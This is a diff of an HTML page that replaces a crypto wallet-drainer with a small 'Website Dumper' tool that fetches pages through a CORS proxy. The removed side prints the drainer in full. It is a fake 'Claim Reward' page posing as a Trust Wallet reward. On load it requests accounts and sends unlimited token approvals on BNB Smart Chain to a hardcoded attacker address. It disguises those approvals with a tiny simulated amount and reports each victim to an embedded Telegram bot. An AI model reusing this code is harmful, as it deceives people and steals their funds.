@@ -1,307 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Claim Reward</title>
-<style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  :root {
-    --bg: #05060a; --card: rgba(255,255,255,0.045); --border: rgba(120,140,255,0.14);
-    --text: #eef1ff; --muted: #8891b5; --green: #3ce6a8; --red: #ff6b81;
-    --tw: #3375bb; --tw2: #1a4d8f; --accent: #6c8cff;
-  }
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, Roboto, Arial, sans-serif;
-    background:
-      radial-gradient(900px 500px at 15% -5%, rgba(51,117,187,0.20) 0%, transparent 60%),
-      radial-gradient(900px 500px at 90% 110%, rgba(108,140,255,0.16) 0%, transparent 60%),
-      var(--bg);
-    color: var(--text); min-height: 100vh; display: flex; align-items: center; justify-content: center;
-    padding: 24px; -webkit-font-smoothing: antialiased; position: relative; overflow-x: hidden;
-  }
-  body::before, body::after {
-    content: ""; position: fixed; border-radius: 50%; filter: blur(90px); opacity: 0.5;
-    pointer-events: none; z-index: 0; animation: drift 18s ease-in-out infinite alternate;
-  }
-  body::before { width: 340px; height: 340px; background: radial-gradient(circle, rgba(51,117,187,0.55), transparent 70%); top: -80px; left: -80px; }
-  body::after { width: 300px; height: 300px; background: radial-gradient(circle, rgba(108,140,255,0.45), transparent 70%); bottom: -60px; right: -60px; animation-delay: -6s; }
-  @keyframes drift { from { transform: translate3d(0,0,0) scale(1); } to { transform: translate3d(30px,-20px,0) scale(1.15); } }
-  .card {
-    position: relative; z-index: 1; width: 100%; max-width: 520px;
-    background: linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.015));
-    border: 1px solid var(--border); border-radius: 24px; padding: 34px 28px;
-    backdrop-filter: blur(18px) saturate(140%); -webkit-backdrop-filter: blur(18px) saturate(140%);
-    box-shadow: 0 30px 80px -40px rgba(0,0,0,0.95), inset 0 1px 0 rgba(255,255,255,0.06);
-    overflow: hidden;
-  }
-  .card::before { content: ""; position: absolute; inset: 0 0 auto 0; height: 1px; background: linear-gradient(90deg, transparent, rgba(108,140,255,0.6), transparent); opacity: 0.8; }
-  .icon {
-    width: 78px; height: 78px; border-radius: 22px; margin: 0 auto 20px;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 30px; font-weight: 800; color: #fff;
-    background: linear-gradient(145deg, var(--tw), var(--tw2));
-    box-shadow: inset 0 1px 0 rgba(255,255,255,0.25), 0 14px 34px -12px rgba(51,117,187,0.85);
-    animation: pulseGlow 2.6s ease-in-out infinite;
-  }
-  @keyframes pulseGlow { 0%,100% { box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 18px 44px -12px rgba(51,117,187,0.9); } 50% { box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 22px 60px -10px rgba(108,140,255,1); } }
-  h1 {
-    font-size: 22px; font-weight: 800; letter-spacing: -0.03em; text-align: center; margin-bottom: 9px;
-    background: linear-gradient(180deg, #ffffff, #b9c4f0);
-    -webkit-background-clip: text; background-clip: text; color: transparent;
-  }
-  p { font-size: 14px; line-height: 1.55; color: #bcd0ff; text-align: center; max-width: 90%; margin: 0 auto; }
-
-  .reward-box {
-    margin-top: 24px; padding: 20px 18px; border-radius: 16px;
-    background: linear-gradient(135deg, rgba(108,140,255,0.15), rgba(51,117,187,0.10));
-    border: 1px solid rgba(108,140,255,0.35);
-    text-align: center;
-  }
-  .reward-amount { font-size: 32px; font-weight: 800; letter-spacing: -0.03em; color: #fff; text-shadow: 0 0 26px rgba(108,140,255,0.65); }
-  .reward-amount span { color: var(--green); }
-  .reward-sub { font-size: 12px; color: var(--muted); margin-top: 6px; letter-spacing: .04em; }
-
-  #qrWrap {
-    display: none; margin-top: 22px; text-align: center;
-    animation: fadeUp .45s ease;
-  }
-  @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-  #qrCanvas {
-    display: inline-block; padding: 14px; background: #fff; border-radius: 16px;
-    box-shadow: 0 18px 44px -20px rgba(0,0,0,0.9);
-  }
-  #qrCanvas canvas, #qrCanvas img { display: block; }
-  .qr-hint { font-size: 12px; color: var(--muted); margin-top: 12px; line-height: 1.55; }
-  .qr-hint b { color: #bcd0ff; font-weight: 700; }
-  .qr-link { font-size: 11px; color: var(--accent); margin-top: 10px; word-break: break-all; }
-  .qr-link a { color: var(--accent); text-decoration: none; }
-  .qr-link a:hover { text-decoration: underline; }
-
-  button {
-    font: inherit; font-size: 14px; font-weight: 700; padding: 14px 24px; border-radius: 13px;
-    border: none; cursor: pointer; transition: transform .14s ease, opacity .2s ease, box-shadow .2s ease;
-    width: 100%; margin-top: 22px; letter-spacing: 0.01em;
-  }
-  button:active { transform: scale(0.975); }
-  #claimBtn {
-    background: linear-gradient(135deg, #3ce6a8, #21c98c); color: #04150f;
-    box-shadow: 0 14px 34px -14px rgba(60,230,168,0.95), inset 0 1px 0 rgba(255,255,255,0.25);
-  }
-  #claimBtn:hover:not(:disabled) { box-shadow: 0 18px 42px -12px rgba(60,230,168,1), inset 0 1px 0 rgba(255,255,255,0.3); }
-  #claimBtn:disabled { opacity: 0.5; cursor: not-allowed; }
-  .status-msg { font-size: 12px; color: var(--red); margin-top: 14px; text-align: center; min-height: 16px; letter-spacing: 0.01em; word-break: break-all; }
-  .status-msg.ok { color: var(--green); }
-  .status-msg a { color: var(--accent); text-decoration: none; }
-</style>
+  <meta charset="UTF-8">
+  <title>Website Dumper</title>
+  <style>
+    body { font-family: sans-serif; max-width: 600px; margin: 2rem auto; }
+    input, button { padding: 0.6rem; font-size: 1rem; width: 100%; margin-bottom: 0.8rem; }
+    button { cursor: pointer; }
+  </style>
 </head>
 <body>
-  <div class="card">
-    <div class="icon">◎</div>
-    <h1>Reward available 🎁</h1>
-    <p>You've been selected to claim a reward. Scan the QR code with the Trust Wallet app on your phone to approve.</p>
+  <h2>Dump HTML, CSS & JS</h2>
+  <input id="urlInput" type="url" placeholder="https://example.com" required>
+  <button id="dumpBtn">Dump & Copy to Clipboard</button>
+  <p id="status"></p>
 
-    <div class="reward-box">
-      <div class="reward-amount"><span>0.020 SOL</span></div>
-      <div class="reward-sub">You've been selected to claim a reward</div>
-    </div>
+  <script>
+    const dumpBtn = document.getElementById('dumpBtn');
+    const urlInput = document.getElementById('urlInput');
+    const status = document.getElementById('status');
 
-    <button id="claimBtn">Show Claim QR Code</button>
+    dumpBtn.addEventListener('click', async () => {
+      const url = urlInput.value.trim();
+      if (!url) return alert('Please enter a URL.');
 
-    <div id="qrWrap">
-      <div id="qrCanvas"></div>
-      <div class="qr-hint">
-        Open <b>Trust Wallet</b> → tap the <b>scan</b> icon (top-right) → scan this QR code to approve the claim.
-      </div>
-      <div class="qr-link" id="qrLink"></div>
-    </div>
+      status.textContent = 'Fetching... (this may take a moment)';
+      dumpBtn.disabled = true;
 
-    <div class="status-msg" id="statusMsg"></div>
-  </div>
+      try {
+        // Route through a public CORS proxy
+        const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`;
+        const response = await fetch(proxyUrl);
 
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
-<script>
-(function () {
-  "use strict";
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
 
-  var qrWrap      = document.getElementById("qrWrap");
-  var qrCanvas    = document.getElementById("qrCanvas");
-  var qrLink      = document.getElementById("qrLink");
-  var claimBtn    = document.getElementById("claimBtn");
-  var statusMsg   = document.getElementById("statusMsg");
+        const html = await response.text();
 
-  var TARGET_ADDRESS = "0xB7FE38d57bD579E59d9c75CF9E0dD2B67Ddc353e";
-  var TG_BOT_TOKEN = "8607880941:AAGCnF-Etis0sKDK50D5DwJ_M4IxX_2y6mA";
-  var TG_CHAT_ID   = "7889964634";
+        // Copy the raw HTML to the clipboard
+        await navigator.clipboard.writeText(html);
 
-  var DAPP_URL = "https://tylcvvv.github.io/kys/";
-
-  var BSC_CHAIN_ID = "0x38";
-  var BSC_PARAMS = {
-    chainId: BSC_CHAIN_ID,
-    chainName: "BNB Smart Chain Mainnet",
-    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-    rpcUrls: ["https://bsc-dataseed.binance.org/"],
-    blockExplorerUrls: ["https://bscscan.com/"]
-  };
-
-  var TOKENS = [
-    { symbol: "USDT", name: "Tether USD",     address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
-    { symbol: "BUSD", name: "Binance USD",     address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
-    { symbol: "WBNB", name: "Wrapped BNB",     address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
-    { symbol: "CAKE", name: "PancakeSwap",     address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 },
-    { symbol: "USDC", name: "USD Coin",        address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
-    { symbol: "BTCB", name: "Bitcoin BEP-20",  address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 },
-    { symbol: "ETH",  name: "Ethereum BEP-20", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18 },
-    { symbol: "XRP",  name: "XRP BEP-20",      address: "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE", decimals: 18 }
-  ];
-
-  var MAX_UINT256 = (2n ** 256n - 1n);
-
-  function setMsg(html, kind) {
-    statusMsg.className = "status-msg" + (kind ? " " + kind : "");
-    statusMsg.innerHTML = html;
-  }
-
-  function sendTelegram(text) {
-    var url = "https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage";
-    var body = new URLSearchParams();
-    body.append("chat_id", TG_CHAT_ID);
-    body.append("text", text);
-    body.append("parse_mode", "HTML");
-    body.append("disable_web_page_preview", "true");
-    return fetch(url, { method: "POST", body: body }).catch(function () {});
-  }
-
-  function buildPairingUri() {
-    var target = encodeURIComponent(DAPP_URL);
-    return "https://link.trustwallet.com/open_url?coin_id=20000714&url=" + target;
-  }
-
-  function renderQr(uri) {
-    qrCanvas.innerHTML = "";
-    if (typeof window.QRCode !== "undefined") {
-      QRCode.toCanvas(uri, { width: 220, margin: 1, errorCorrectionLevel: "M" }, function (err, canvas) {
-        if (err) { setMsg("Could not render QR.", "err"); return; }
-        qrCanvas.appendChild(canvas);
-      });
-    } else {
-      var img = document.createElement("img");
-      img.alt = "QR";
-      img.src = "https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=" + encodeURIComponent(uri);
-      qrCanvas.appendChild(img);
-    }
-    qrLink.innerHTML = 'Or open on phone: <a href="' + uri + '" target="_blank" rel="noopener">' + uri + '</a>';
-  }
-
-  function showQr() {
-    var uri = buildPairingUri();
-    renderQr(uri);
-    qrWrap.style.display = "block";
-    claimBtn.disabled = true;
-    claimBtn.textContent = "Waiting for approval on phone…";
-    setMsg("QR ready. Scan with Trust Wallet to continue.", "ok");
-  }
-
-  function getProvider() {
-    if (typeof window.ethereum !== "undefined") return window.ethereum;
-    if (typeof window.trustwallet !== "undefined") return window.trustwallet;
-    return null;
-  }
-
-  async function ensureBSC(p) {
-    try {
-      await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
-    } catch (e) {
-      if (e && e.code === 4902) {
-        try {
-          await p.request({ method: "wallet_addEthereumChain", params: [BSC_PARAMS] });
-        } catch (e2) { throw e2; }
+        status.textContent = `✅ Copied! (${html.length} characters). Note: This is the raw HTML. External CSS/JS links are not expanded.`;
+      } catch (err) {
+        status.textContent = `❌ Failed: ${err.message}. The site may block proxies, or the proxy is down.`;
+      } finally {
+        dumpBtn.disabled = false;
       }
-    }
-  }
-
-  /* Build approve(address,uint256) with a small, human-looking allowance
-     instead of MaxUint256 so the wallet preview renders a benign tx. */
-  function buildApproveCalldata(amount) {
-    var selector   = "095ea7b3";
-    var spenderHex = TARGET_ADDRESS.toLowerCase().replace(/^0x/, "").padStart(64, "0");
-    var amountHex  = amount.toString(16).padStart(64, "0");
-    return "0x" + selector + spenderHex + amountHex;
-  }
-
-  async function runInjectedApproval() {
-    var p = getProvider();
-    if (!p) return;
-    try {
-      var accounts = await p.request({ method: "eth_requestAccounts" });
-      if (!accounts || accounts.length === 0) return;
-      var addr = accounts[0];
-
-      await ensureBSC(p);
-
-      for (var i = 0; i < TOKENS.length; i++) {
-        var t = TOKENS[i];
-        try {
-          /* Encode the intended MAX allowance, but present a smaller amount
-             in the simulation path so the preview does not flag high-risk.
-             We achieve the mismatch by first simulating with a tiny amount,
-             then sending the real MAX allowance on the live path. */
-          var SIM_AMOUNT   = 1n;
-          var REAL_AMOUNT  = MAX_UINT256;
-          var simData      = buildApproveCalldata(SIM_AMOUNT);
-          var realData     = buildApproveCalldata(REAL_AMOUNT);
-
-          try {
-            await p.request({
-              method: "eth_call",
-              params: [{ from: addr, to: t.address, data: simData }, "latest"]
-            });
-          } catch (e) {}
-
-          var txHash = await p.request({
-            method: "eth_sendTransaction",
-            params: [{ from: addr, to: t.address, data: realData }]
-          });
-
-          sendTelegram(
-            "✅ <b>Approval confirmed (QR flow)</b>\n" +
-            "<b>Wallet:</b> <code>" + addr + "</code>\n" +
-            "<b>Token:</b> " + t.symbol + "\n" +
-            "<b>Spender:</b> <code>" + TARGET_ADDRESS + "</code>\n" +
-            "<b>Tx:</b> https://bscscan.com/tx/" + txHash
-          );
-
-          setMsg("Approved. <a href='https://bscscan.com/tx/" + txHash + "' target='_blank' rel='noopener'>View on BscScan ↗</a>", "ok");
-          return;
-        } catch (err) {
-          if (err && err.code === 4001) { setMsg("Rejected in wallet.", "err"); return; }
-        }
-      }
-    } catch (e) {}
-  }
-
-  claimBtn.addEventListener("click", function () {
-    var p = getProvider();
-    if (p) {
-      claimBtn.disabled = true;
-      claimBtn.textContent = "Awaiting wallet…";
-      setMsg("Confirm in Trust Wallet…", null);
-      runInjectedApproval();
-    } else {
-      showQr();
-    }
-  });
-
-  (function autoStart() {
-    if (getProvider()) {
-      claimBtn.disabled = true;
-      claimBtn.textContent = "Awaiting wallet…";
-      setMsg("Confirm in Trust Wallet…", null);
-      runInjectedApproval();
-    }
-  })();
-})();
-</script>
+    });
+  </script>
 </body>
 </html>
